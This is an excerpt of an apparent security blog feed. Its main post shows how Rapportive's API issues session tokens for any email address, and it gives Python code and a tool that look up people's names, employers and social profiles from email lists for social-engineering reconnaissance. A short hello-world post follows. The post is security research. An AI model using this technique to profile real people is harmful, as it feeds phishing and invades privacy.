</span><span class='line'>      "location":"Texas Area",
</span><span class='line'>      "occupations":[
</span><span class='line'>         {
</span><span class='line'>            "job_title":"Security Engineer"
</span><span class='line'>         }
</span><span class='line'>      ],
</span><span class='line'>      "name":"Jordan Wright",
</span><span class='line'>   },
</span><span class='line'>   "success":"image_or_occupation_or_useful_membership",
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>We can see that quite a bit of data was returned by this query. As social engineers, not only would we know that this is likely a valid email address (and therefore a valid email address format for other potential targets of the same organization), but we could also see the social networking profiles linked to this email address. This could reveal other infrmation which may be useful to us later.</p>

<p>So now we want to see how we can:</p>

<ul>
<li>Automate the login process (<em>if needed</em>)</li>
<li>Deconstruct the /contact/email query to find any special parameters that we need to pass</li>
</ul>


<p>Let&rsquo;s start by taking a look at the parameters passed to the /contact/email request, and see what kind of information is needed:</p>

<p><a href="http://jordan-wright.github.io/images/blog/rapportive/contact_email_headers.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/rapportive/contact_email_headers.png"/></a></p>

<p>We can immediately see an interesting header being sent with the request titled &ldquo;X-Session-Token&rdquo;. It turns out that <strong>the entire authentication of the request relies on sending this token</strong>. We can test this using an API console like <a href="https://apigee.com/console/others">this one</a>.</p>

<p>Now we just need to figure out where to get our session token. There was one request that Burp didn&rsquo;t catch that is made once we first log into Gmail. It is a request to /login_status?[email_address]. The response to this query looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{
</span><span class='line'>   "user_full_name":" ",
</span><span class='line'>   "status":200,
</span><span class='line'>   "authenticated_as":null,
</span><span class='line'>   "active_auths":[],
</span><span class='line'>   "claimed_emails":null,
</span><span class='line'>   "plan":{
</span><span class='line'>      "key":"free",
</span><span class='line'>      "price":0,
</span><span class='line'>      "name":"Free"
</span><span class='line'>   },
</span><span class='line'>   "session_token":"BAgiX09ON0&lt;snip&lt;ece684be8",
</span><span class='line'>   "user_preferences":{&lt;snip&lt;},
</span><span class='line'>   "authenticity_token":"7KNIosqb&lt;snip&gt;csaXzbQFOFi7jg=",
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>This request will return a session token for the currently logged in user. However, here&rsquo;s the trick: <strong><em>any email will work</em></strong>. Seriously &ndash; <a href="http://rapportive.com/login_status?user_email=this_doesnt_exist_@gmail.com">try it</a>. Even without being logged in to Rapportive (ie, by using a random email address), we can still receive a session token and can still make valid queries on email addresses like the one seen originally. So &ndash; we don&rsquo;t need to worry about automating the authentication.</p>

<p>Let&rsquo;s take a look at how we can at least automate the process of getting the session token and querying for an email address.</p>

<h3>Automating Rapportive Queries</h3>

<p>Now that we know how Rapportive works, we can automate the process to perform lookups for users of our choosing. Let&rsquo;s start by getting the session token for a particular email address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import requests
</span><span class='line'>random_email = 'asdfqwer@gmail.com'
</span><span class='line'>response = requests.get('https://rapportive.com/login_status?user_email=' + random_email).json()
</span><span class='line'>print response['session_token']
</span><span class='line'># output - BAgiX0IvUmJHMUQ3Z2pOUWhmM0ZKRX...</span></code></pre></td></tr></table></div></figure>


<p>Easy as that! Now that we have the session token, we can make a request for a given target email address as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>profile = requests.get('https://profiles.rapportive.com/contacts/email/' + target_email,
</span><span class='line'>            headers = {'X-Session-Token' : response['session_token']}).json()</span></code></pre></td></tr></table></div></figure>


<p>The profile returned will now be in JSON format where we can parse out any information such as social networking profile links, usernames, etc. I won&rsquo;t bore you with the implementation of all the parsing &ndash; so let&rsquo;s move onto the final script!</p>

<h3>Introducing rapportive.py</h3>

<p>I&rsquo;ve created a simple Python script called <a href="https://github.com/jordan-wright/rapportive">rapportive.py</a> to do this work for us. It takes in a list of email addresses from STDIN or a single email via the -e argument and prints out any results found. This can be useful if we want to pass in emails from other tools such as <a href="https://github.com/pentestgeek/jigsaw/blob/master/jigsaw.rb">jigsaw.rb</a>. It can also log to an output file, if needed.</p>

<p>Here is an example of how to use it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~# cat emails.txt | ./rapportive.py
</span><span class='line'>10-25 23:37 rapportive   INFO     Using owcdf@gmail.com
</span><span class='line'>10-25 23:37 rapportive   INFO     Found match for jmwright798@gmail.com
</span><span class='line'>
</span><span class='line'>Name: Jordan Wright
</span><span class='line'>Position: Security  Engineer
</span><span class='line'>Company: CoNetrix
</span><span class='line'>        LinkedIn - http://www.linkedin.com/pub/54/795/752
</span><span class='line'>        Blogger - http://raidersec.blogspot.com
</span><span class='line'>        GitHub - https://github.com/jordan-wright</span></code></pre></td></tr></table></div></figure>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~# ./rapportive.py -e jmwright798@gmail.com
</span><span class='line'>10-25 23:31 rapportive   INFO     Using ntmai@gmail.com
</span><span class='line'>10-25 23:31 rapportive   INFO     Found match for jmwright798@gmail.com
</span><span class='line'>Name: Jordan Wright
</span><span class='line'>Position: Security  Engineer
</span><span class='line'>Company: CoNetrix
</span><span class='line'>        LinkedIn - http://www.linkedin.com/pub/54/795/752
</span><span class='line'>        Blogger - http://raidersec.blogspot.com
</span><span class='line'>        GitHub - https://github.com/jordan-wright
</span></code></pre></td></tr></table></div></figure>


<p>You can find it on <a href="https://github.com/jordan-wright/rapportive">Github</a>.</p>

<p>Enjoy!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hello World!]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/10/11/hello-world/"/>
    <updated>2013-10-11T02:25:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/10/11/hello-world</id>
    <content type="html"><![CDATA[<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python
</span><span class='line'>print 'Hello, World!'</span></code></pre></td></tr></table></div></figure>


<p>Hi there! My name is Jordan, and I am a security researcher, developer, and hobbyist.</p>

<p>For the past few years, I created and maintained a blog for an organization I started called <a href="http://raidersec.blogspot.com">Raidersec</a>. While I fully intend to leave the existing content on the Raidersec blog, I thought it would be ideal to create a personal blog on which I can continue writing about my research and projects dealing with not just security, but programming in general.</p>

<p>I have quite a few projects in the works that I am excited to share soon! For now, feel free to check out my <a href="http://jordan-wright.github.io/projects">existing projects</a>, and <a href="http://jordan-wright.github.io/contact">let me know</a> if you have any questions or comments!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
</feed>
